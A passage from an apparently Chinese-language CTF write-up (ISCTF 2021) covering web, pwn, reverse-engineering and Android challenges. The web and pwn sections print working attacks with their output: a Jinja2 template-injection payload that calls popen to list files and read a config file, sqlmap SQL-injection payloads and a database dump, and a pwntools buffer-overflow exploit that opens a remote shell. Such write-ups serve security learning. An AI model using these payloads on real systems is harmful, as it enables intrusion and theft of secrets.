&#x27;werkzeug.datastructures.ContentRange&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.FileStorage&#x27;&gt;, &lt;class &#x27;dataclasses._HAS_DEFAULT_FACTORY_CLASS&#x27;&gt;, &lt;class &#x27;dataclasses._MISSING_TYPE&#x27;&gt;, &lt;class &#x27;dataclasses._FIELD_BASE&#x27;&gt;, &lt;class &#x27;dataclasses.InitVar&#x27;&gt;, &lt;class &#x27;dataclasses.Field&#x27;&gt;, &lt;class &#x27;dataclasses._DataclassParams&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.Event&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.MultipartDecoder&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.MultipartEncoder&#x27;&gt;, &lt;class &#x27;importlib.abc.Finder&#x27;&gt;, &lt;class &#x27;importlib.abc.Loader&#x27;&gt;, &lt;class &#x27;importlib.abc.ResourceReader&#x27;&gt;, &lt;class &#x27;pkgutil.ImpImporter&#x27;&gt;, &lt;class &#x27;pkgutil.ImpLoader&#x27;&gt;, &lt;class &#x27;hmac.HMAC&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.ClosingIterator&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.FileWrapper&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi._RangeWrapper&#x27;&gt;, &lt;class &#x27;werkzeug.utils.HTMLBuilder&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.accept.AcceptMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.auth.AuthorizationMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.auth.WWWAuthenticateMixin&#x27;&gt;, &lt;class &#x27;_json.Scanner&#x27;&gt;, &lt;class &#x27;_json.Encoder&#x27;&gt;, &lt;class &#x27;json.decoder.JSONDecoder&#x27;&gt;, &lt;class &#x27;json.encoder.JSONEncoder&#x27;&gt;, &lt;class &#x27;werkzeug.formparser.FormDataParser&#x27;&gt;, &lt;class &#x27;werkzeug.formparser.MultiPartParser&#x27;&gt;, &lt;class &#x27;werkzeug.user_agent.UserAgent&#x27;&gt;, &lt;class &#x27;werkzeug.useragents._UserAgentParser&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.request.Request&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.request.StreamOnlyMixin&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.response.Response&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.response.ResponseStream&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.response.ResponseStreamMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.etag.ETagRequestMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.etag.ETagResponseMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.user_agent.UserAgentMixin&#x27;&gt;, &lt;class &#x27;werkzeug.test._TestCookieHeaders&#x27;&gt;, &lt;class &#x27;werkzeug.test._TestCookieResponse&#x27;&gt;, &lt;class &#x27;werkzeug.test.EnvironBuilder&#x27;&gt;, &lt;class &#x27;werkzeug.test.Client&#x27;&gt;, &lt;class &#x27;decimal.Decimal&#x27;&gt;, &lt;class &#x27;decimal.Context&#x27;&gt;, &lt;class &#x27;decimal.SignalDictMixin&#x27;&gt;, &lt;class &#x27;decimal.ContextManager&#x27;&gt;, &lt;class &#x27;numbers.Number&#x27;&gt;, &lt;class &#x27;uuid.UUID&#x27;&gt;, &lt;class &#x27;_pickle.Unpickler&#x27;&gt;, &lt;class &#x27;_pickle.Pickler&#x27;&gt;, &lt;class &#x27;_pickle.Pdata&#x27;&gt;, &lt;class &#x27;_pickle.PicklerMemoProxy&#x27;&gt;, &lt;class &#x27;_pickle.UnpicklerMemoProxy&#x27;&gt;, &lt;class &#x27;pickle._Framer&#x27;&gt;, &lt;class &#x27;pickle._Unframer&#x27;&gt;, &lt;class &#x27;pickle._Pickler&#x27;&gt;, &lt;class &#x27;pickle._Unpickler&#x27;&gt;, &lt;class &#x27;jinja2.bccache.Bucket&#x27;&gt;, &lt;class &#x27;jinja2.bccache.BytecodeCache&#x27;&gt;, &lt;class &#x27;jinja2.utils.MissingType&#x27;&gt;, &lt;class &#x27;jinja2.utils.LRUCache&#x27;&gt;, &lt;class &#x27;jinja2.utils.Cycler&#x27;&gt;, &lt;class &#x27;jinja2.utils.Joiner&#x27;&gt;, &lt;class &#x27;jinja2.utils.Namespace&#x27;&gt;, &lt;class &#x27;jinja2.nodes.EvalContext&#x27;&gt;, &lt;class &#x27;jinja2.nodes.Node&#x27;&gt;, &lt;class &#x27;jinja2.visitor.NodeVisitor&#x27;&gt;, &lt;class &#x27;jinja2.idtracking.Symbols&#x27;&gt;, &lt;class &#x27;jinja2.compiler.MacroRef&#x27;&gt;, &lt;class &#x27;jinja2.compiler.Frame&#x27;&gt;, &lt;class &#x27;jinja2.runtime.TemplateReference&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Context&#x27;&gt;, &lt;class &#x27;jinja2.runtime.BlockReference&#x27;&gt;, &lt;class &#x27;jinja2.runtime.LoopContext&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Macro&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Undefined&#x27;&gt;, &lt;class &#x27;ast.NodeVisitor&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Failure&#x27;&gt;, &lt;class &#x27;jinja2.lexer.TokenStreamIterator&#x27;&gt;, &lt;class &#x27;jinja2.lexer.TokenStream&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Lexer&#x27;&gt;, &lt;class &#x27;jinja2.parser.Parser&#x27;&gt;, &lt;class &#x27;jinja2.environment.Environment&#x27;&gt;, &lt;class &#x27;jinja2.environment.Template&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateModule&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateExpression&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateStream&#x27;&gt;, &lt;class &#x27;jinja2.loaders.BaseLoader&#x27;&gt;, &lt;class &#x27;werkzeug.local.Local&#x27;&gt;, &lt;class &#x27;werkzeug.local.LocalStack&#x27;&gt;, &lt;class &#x27;werkzeug.local.LocalManager&#x27;&gt;, &lt;class &#x27;werkzeug.local._ProxyLookup&#x27;&gt;, &lt;class &#x27;werkzeug.local.LocalProxy&#x27;&gt;, &lt;class &#x27;difflib.SequenceMatcher&#x27;&gt;, &lt;class &#x27;difflib.Differ&#x27;&gt;, &lt;class &#x27;difflib.HtmlDiff&#x27;&gt;, &lt;class &#x27;pprint._safe_key&#x27;&gt;, &lt;class &#x27;pprint.PrettyPrinter&#x27;&gt;, &lt;class &#x27;werkzeug.routing.RuleFactory&#x27;&gt;, &lt;class &#x27;werkzeug.routing.RuleTemplate&#x27;&gt;, &lt;class &#x27;werkzeug.routing.BaseConverter&#x27;&gt;, &lt;class &#x27;werkzeug.routing.Map&#x27;&gt;, &lt;class &#x27;werkzeug.routing.MapAdapter&#x27;&gt;, &lt;class &#x27;gettext.NullTranslations&#x27;&gt;, &lt;class &#x27;click._compat._FixupStream&#x27;&gt;, &lt;class &#x27;click._compat._AtomicFile&#x27;&gt;, &lt;class &#x27;click.utils.LazyFile&#x27;&gt;, &lt;class &#x27;click.utils.KeepOpenFile&#x27;&gt;, &lt;class &#x27;click.utils.PacifyFlushWrapper&#x27;&gt;, &lt;class &#x27;click.types.ParamType&#x27;&gt;, &lt;class &#x27;click.parser.Option&#x27;&gt;, &lt;class &#x27;click.parser.Argument&#x27;&gt;, &lt;class &#x27;click.parser.ParsingState&#x27;&gt;, &lt;class &#x27;click.parser.OptionParser&#x27;&gt;, &lt;class &#x27;click.formatting.HelpFormatter&#x27;&gt;, &lt;class &#x27;click.core.Context&#x27;&gt;, &lt;class &#x27;click.core.BaseCommand&#x27;&gt;, &lt;class &#x27;click.core.Parameter&#x27;&gt;, &lt;class &#x27;flask.signals.Namespace&#x27;&gt;, &lt;class &#x27;flask.signals._FakeSignal&#x27;&gt;, &lt;class &#x27;flask.cli.DispatchingApp&#x27;&gt;, &lt;class &#x27;flask.cli.ScriptInfo&#x27;&gt;, &lt;class &#x27;flask.config.ConfigAttribute&#x27;&gt;, &lt;class &#x27;flask.ctx._AppCtxGlobals&#x27;&gt;, &lt;class &#x27;flask.ctx.AppContext&#x27;&gt;, &lt;class &#x27;flask.ctx.RequestContext&#x27;&gt;, &lt;class &#x27;flask.scaffold.Scaffold&#x27;&gt;, &lt;class &#x27;itsdangerous._json._CompactJSON&#x27;&gt;, &lt;class &#x27;itsdangerous.signer.SigningAlgorithm&#x27;&gt;, &lt;class &#x27;itsdangerous.signer.Signer&#x27;&gt;, &lt;class &#x27;itsdangerous.serializer.Serializer&#x27;&gt;, &lt;class &#x27;flask.json.tag.JSONTag&#x27;&gt;, &lt;class &#x27;flask.json.tag.TaggedJSONSerializer&#x27;&gt;, &lt;class &#x27;flask.sessions.SessionInterface&#x27;&gt;, &lt;class &#x27;flask.blueprints.BlueprintSetupState&#x27;&gt;, &lt;class &#x27;__future__._Feature&#x27;&gt;, &lt;class &#x27;zipfile.ZipInfo&#x27;&gt;, &lt;class &#x27;zipfile.LZMACompressor&#x27;&gt;, &lt;class &#x27;zipfile.LZMADecompressor&#x27;&gt;, &lt;class &#x27;zipfile._SharedFile&#x27;&gt;, &lt;class &#x27;zipfile._Tellable&#x27;&gt;, &lt;class &#x27;zipfile.ZipFile&#x27;&gt;, &lt;class &#x27;zipfile.Path&#x27;&gt;, &lt;class &#x27;pyexpat.xmlparser&#x27;&gt;, &lt;class &#x27;plistlib.Data&#x27;&gt;, &lt;class &#x27;plistlib.UID&#x27;&gt;, &lt;class &#x27;plistlib._PlistParser&#x27;&gt;, &lt;class &#x27;plistlib._DumbXMLWriter&#x27;&gt;, &lt;class &#x27;plistlib._BinaryPlistParser&#x27;&gt;, &lt;class &#x27;plistlib._BinaryPlistWriter&#x27;&gt;, &lt;class &#x27;textwrap.TextWrapper&#x27;&gt;, &lt;class &#x27;pkg_resources.extern.VendorImporter&#x27;&gt;, &lt;class &#x27;pkg_resources._vendor.six._LazyDescr&#x27;&gt;, &lt;class &#x27;pkg_resources._vendor.six._SixMetaPathImporter&#x27;&gt;, &lt;class &#x27;pkg_resources._vendor.six._LazyDescr&#x27;&gt;, &lt;class &#x27;pkg_resources._vendor.six._SixMetaPathImporter&#x27;&gt;, &lt;class &#x27;pkg_resources._vendor.appdirs.AppDirs&#x27;&gt;, &lt;class &#x27;pkg_resources.extern.packaging._structures.Infinity&#x27;&gt;, &lt;class &#x27;pkg_resources.extern.packaging._structures.NegativeInfinity&#x27;&gt;, &lt;class &#x27;pkg_resources.extern.packaging.version._BaseVersion&#x27;&gt;, &lt;class &#x27;pkg_resources.extern.packaging.specifiers.BaseSpecifier&#x27;&gt;, &lt;class &#x27;pkg_resources._vendor.pyparsing._Constants&#x27;&gt;, &lt;class &#x27;pkg_resources._vendor.pyparsing._ParseResultsWithOffset&#x27;&gt;, &lt;class &#x27;pkg_resources._vendor.pyparsing.ParseResults&#x27;&gt;, &lt;class &#x27;pkg_resources._vendor.pyparsing.ParserElement._UnboundedCache&#x27;&gt;, &lt;class &#x27;pkg_resources._vendor.pyparsing.ParserElement._FifoCache&#x27;&gt;, &lt;class &#x27;pkg_resources._vendor.pyparsing.ParserElement&#x27;&gt;, &lt;class &#x27;pkg_resources._vendor.pyparsing._NullToken&#x27;&gt;, &lt;class &#x27;pkg_resources._vendor.pyparsing.OnlyOnce&#x27;&gt;, &lt;class &#x27;pkg_resources._vendor.pyparsing.pyparsing_common&#x27;&gt;, &lt;class &#x27;pkg_resources.extern.packaging.markers.Node&#x27;&gt;, &lt;class &#x27;pkg_resources.extern.packaging.markers.Marker&#x27;&gt;, &lt;class &#x27;pkg_resources.extern.packaging.requirements.Requirement&#x27;&gt;, &lt;class &#x27;pkg_resources.IMetadataProvider&#x27;&gt;, &lt;class &#x27;pkg_resources.WorkingSet&#x27;&gt;, &lt;class &#x27;pkg_resources.Environment&#x27;&gt;, &lt;class &#x27;pkg_resources.ResourceManager&#x27;&gt;, &lt;class &#x27;pkg_resources.NullProvider&#x27;&gt;, &lt;class &#x27;pkg_resources.NoDists&#x27;&gt;, &lt;class &#x27;pkg_resources.EntryPoint&#x27;&gt;, &lt;class &#x27;pkg_resources.Distribution&#x27;&gt;, &lt;class &#x27;config.Config&#x27;&gt;, &lt;class &#x27;unicodedata.UCD&#x27;&gt;]</span><br><br><br>Payload：/wow/?id=&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;ls&#x27;</span>).<span class="hljs-built_in">read</span>()&#125;&#125;<br><span class="hljs-comment">#_pycache__ app.py config.py templates venv</span><br><br>Payload：/wow/?id=&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;cat config.py&#x27;</span>).<span class="hljs-built_in">read</span>()&#125;&#125;<br><span class="hljs-comment">#from datetime import timedelta class Config(object): DEBUG = True TESTING = False SECRET_KEY = &quot;ISCTF&#123;weLc0me_T22_Ssti1ll&#125;&quot; Flag = &#x27;ISCTF&#123;qwdwegegerg&#125;&#x27; class DevelopmentConfig(Config): DEBUG = True class TestingConfig(Config): TESTING = True class FlagConfig(Config): Flag=&#x27;ISCTF&#123;fake_flag&#125;&#x27; config = &#123; &#x27;development&#x27;: DevelopmentConfig, &#x27;default&#x27;: DevelopmentConfig, &#x27;flag&#x27; : FlagConfig &#125;</span><br><br><br><br>flag：ISCTF&#123;weLc0me_T22_Ssti1ll&#125;<br></code></pre></td></tr></table></figure><p>看别人wp，发现直接/wow/?id=好像也行</p><h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p>sqlmap一把梭</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ sqlmap -r post.txt -D users -T flag -C flag --dump<br>        ___<br>       __H__                                                                                                                                                     <br> ___ ___[<span class="hljs-string">&#x27;]_____ ___ ___  &#123;1.5.7#stable&#125;                                                                                                                         </span><br><span class="hljs-string">|_ -| . [.]     | .&#x27;</span>| . |                                                                                                                                        <br>|___|_  [,]_|_|_|__,|  _|                                                                                                                                        <br>      |_|V...       |_|   http://sqlmap.org                                                                                                                      <br><br>[!] legal disclaimer: Usage of sqlmap <span class="hljs-keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="hljs-string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] starting @ 22:40:51 /2021-10-21/</span><br><span class="hljs-string"></span><br><span class="hljs-string">[22:40:51] [INFO] parsing HTTP request from &#x27;</span>post.txt<span class="hljs-string">&#x27;</span><br><span class="hljs-string">[22:40:52] [INFO] resuming back-end DBMS &#x27;</span>mysql<span class="hljs-string">&#x27; </span><br><span class="hljs-string">[22:40:52] [INFO] testing connection to the target URL</span><br><span class="hljs-string">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="hljs-string">---</span><br><span class="hljs-string">Parameter: username (GET)</span><br><span class="hljs-string">    Type: error-based</span><br><span class="hljs-string">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="hljs-string">    Payload: username=admin&#x27;</span> AND GTID_SUBSET(CONCAT(0x71786b7871,(SELECT (ELT(8845=8845,1))),0x717a6b6b71),8845)-- kRvQ&amp;password=123<br><br>    Type: time-based blind<br>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br>    Payload: username=admin<span class="hljs-string">&#x27; AND (SELECT 2550 FROM (SELECT(SLEEP(5)))ySHy)-- rsWg&amp;password=123</span><br><span class="hljs-string"></span><br><span class="hljs-string">Parameter: password (GET)</span><br><span class="hljs-string">    Type: error-based</span><br><span class="hljs-string">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="hljs-string">    Payload: username=admin&amp;password=123&#x27;</span> AND GTID_SUBSET(CONCAT(0x71786b7871,(SELECT (ELT(5555=5555,1))),0x717a6b6b71),5555)-- KeQK<br><br>    Type: time-based blind<br>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br>    Payload: username=admin&amp;password=123<span class="hljs-string">&#x27; AND (SELECT 2329 FROM (SELECT(SLEEP(5)))VyYl)-- yARH</span><br><span class="hljs-string">---</span><br><span class="hljs-string">there were multiple injection points, please select the one to use for following injections:</span><br><span class="hljs-string">[0] place: GET, parameter: username, type: Single quoted string (default)</span><br><span class="hljs-string">[1] place: GET, parameter: password, type: Single quoted string</span><br><span class="hljs-string">[q] Quit</span><br><span class="hljs-string">&gt; 1</span><br><span class="hljs-string">[22:40:53] [INFO] the back-end DBMS is MySQL</span><br><span class="hljs-string">web application technology: Apache 2.4.39, PHP 7.3.4</span><br><span class="hljs-string">back-end DBMS: MySQL &gt;= 5.6</span><br><span class="hljs-string">[22:40:53] [INFO] fetching entries of column(s) &#x27;</span>flag<span class="hljs-string">&#x27; for table &#x27;</span>flag<span class="hljs-string">&#x27; in database &#x27;</span>users<span class="hljs-string">&#x27;</span><br><span class="hljs-string">[22:40:54] [INFO] retrieved: &#x27;</span>ISCTF&#123;ThiS_Is_easy_Sql_sqlMap_yyds&#125;<span class="hljs-string">&#x27;</span><br><span class="hljs-string">Database: users</span><br><span class="hljs-string">Table: flag</span><br><span class="hljs-string">[1 entry]</span><br><span class="hljs-string">+-------------------------------------+</span><br><span class="hljs-string">| flag                                |</span><br><span class="hljs-string">+-------------------------------------+</span><br><span class="hljs-string">| ISCTF&#123;ThiS_Is_easy_Sql_sqlMap_yyds&#125; |</span><br><span class="hljs-string">+-------------------------------------+</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">flag：ISCTF&#123;ThiS_Is_easy_Sql_sqlMap_yyds&#125;</span><br></code></pre></td></tr></table></figure><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="杰哥的nc"><a href="#杰哥的nc" class="headerlink" title="杰哥的nc"></a>杰哥的nc</h2><p>nc 123.57.253.184 10010</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">int <span class="hljs-function"><span class="hljs-title">main</span></span>()&#123;<br>char cmd[100];<br>scanf(<span class="hljs-string">&quot;%s&quot;</span>,&amp;cmd);<br>system(cmd);<br><span class="hljs-built_in">return</span> 0;<br>&#125;<br></code></pre></td></tr></table></figure><p>getflag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ nc 123.57.253.184 10010 <br>/bin/sh<br>ls<br>bin<br>dev<br>flag.txt<br>lib<br>lib32<br>lib64<br>nc<br>cat flag.txt<br>ISCTF&#123;Looks_your_nc_works_we11&#125;<br></code></pre></td></tr></table></figure><h2 id="救救小肥鲨吧"><a href="#救救小肥鲨吧" class="headerlink" title="救救小肥鲨吧"></a>救救小肥鲨吧</h2><p>出题人：deoplljj</p><p>学校：福建师范大学</p><p>题目描述： 小肥鲨因为一个系统的密码而陷入了困境，需要拿到系统的管理权限，你能帮帮它吗？</p><p>nc 123.57.253.184 10001</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">int __cdecl func(int a1)<br>&#123;<br>  int result; // eax<br>  char s[36]; // [esp+0h] [ebp-28h] BYREF<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;help me : &quot;</span>);<br>  gets(s);<br>  <span class="hljs-keyword">if</span> ( a1 == -1091784722 )<br>    result = system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    result = puts(<span class="hljs-string">&quot;Oh,no&quot;</span>);<br>  <span class="hljs-built_in">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">from pwn import *<br><span class="hljs-comment">#p=process(./help_my_shark)</span><br>p=remote(<span class="hljs-string">&quot;123.57.253.184&quot;</span>,10001)<br>addr=0xBEECAFEE<br>payload=b<span class="hljs-string">&quot;B&quot;</span>*0x28+b<span class="hljs-string">&quot;B&quot;</span>*4+p32(0)+p32(addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ python3 1.py                                                                        <br>[+] Opening connection to 123.57.253.184 on port 10001: Done<br>[*] Switching to interactive mode<br>   ____ ____ _____ ______ ____ <br>  /  _// __// ___//_  __// __/ <br> _/ / _\ \ / /__   / /  / _/   <br>/___//___/ \___/  /_/  /_/     <br>Sponsored by http://www.bluesharkinfo.com/<br><br><br><br><span class="hljs-built_in">help</span> me : $ ls<br>bin<br>dev<br>flag.txt<br>help_my_shark<br>lib<br>lib32<br>lib64<br>$ cat flag.txt<br>ISCTF&#123;Xiao_fei_sha_send_a_like_to_YoU&#125;<br></code></pre></td></tr></table></figure><h1 id="-1"><a href="#-1" class="headerlink" title=""></a></h1><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="简单的Re"><a href="#简单的Re" class="headerlink" title="简单的Re"></a>简单的Re</h2><p>IDA打开shift+F12</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202110/31/101852-438901.png" alt="image-20211031101851517"></p><p>flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ISCTF&#123;debugdebugdebug_@&#125;<br></code></pre></td></tr></table></figure><h2 id="re签到"><a href="#re签到" class="headerlink" title="re签到"></a>re签到</h2><p>查壳工具链接：<a href="https://www.52pojie.cn/thread-437586-1-1.html">https://www.52pojie.cn/thread-437586-1-1.html</a><br>脱壳工具链接：<a href="https://github.com/upx/upx/releases">https://github.com/upx/upx/releases</a></p><p>UPX</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202110/31/101909-450173.png" alt="image-20211031101907920"></p><p>010打开RPX全替换为UPX</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202110/31/101925-564989.png" alt="image-20211031101922962"></p><p>然后upx脱壳</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202110/31/101940-975773.png" alt="image-20211031101938670"></p><p>IDA打开查看伪代码</p><p><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20211031101955528.png" alt="image-20211031101955528"></p><p>代码逻辑：输入字符串s的每一位和10异或  ，然后+2 ，最后得到的字符串再和a[j]数组对比  ，</p><p>可以看到a=”E[K`Ns;5mpp:5?4jnAj@5Ay”</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202110/31/102013-412075.png" alt="image-20211031102011131"></p><p>exp：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">list_a=[]<br>a=<span class="hljs-string">&quot;E[K`Ns;5mpp:5?4jnAj@5Ay&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    list_a.append(ord(i))<br><span class="hljs-built_in">print</span>(list_a)<br><br>flag = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0,len(a)):<br>    flag += chr((list_a[i]-2)^10)<br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment">#ISCTF&#123;39add2978bf5b495&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Reverse-Easy-JAR"><a href="#Reverse-Easy-JAR" class="headerlink" title="Reverse-Easy_JAR"></a>Reverse-Easy_JAR</h2><p>出题人：李黑子</p><p>学校：周口职业技术学院</p><p>题目描述：一种编码和加密</p><p>1.进入文件夹，正常是打不开的，需要使用cmd命令打开：</p><p>2.jar文件，使用jd_gui打开：</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202110/31/102201-435255.png" alt="image-20211031102200027"></p><p>\3. 看对NBEKABsLBisvMDcyJUZWUUU=加密的代码：</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202110/31/102216-391368.png" alt="image-20211031102215111"></p><p>得到代码以后编写脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">import base64<br>m=base64.b64decode(<span class="hljs-string">&#x27;NBEKABsLBisvMDcyJUZWUUU=&#x27;</span>)<br>k=b<span class="hljs-string">&#x27;ctf&#x27;</span><br>flag=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(m)):<br>   flag+=chr(m[i]^k[i%3])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ISCTF&#123;&quot;</span>+flag+<span class="hljs-string">&quot;&#125;&quot;</span>)<br><br><span class="hljs-comment">#ISCTF&#123;Welcome_ISCTF2021&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><h2 id="猜数字"><a href="#猜数字" class="headerlink" title="猜数字"></a>猜数字</h2><p>apk反编译</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202110/31/102231-697318.png" alt="image-20211031102229830"></p><p>按照顺序拼接flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ISCTF&#123;5ec07215-716f-498a-85ad-5f39322f707b&#125;<br></code></pre></td></tr></table></figure><h2 id="锁机病毒"><a href="#锁机病毒" class="headerlink" title="锁机病毒"></a>锁机病毒</h2><p>六位密码，后缀改为zip，解压出liblock.so，IDA打开搜索main函数</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202110/31/102245-98678.png" 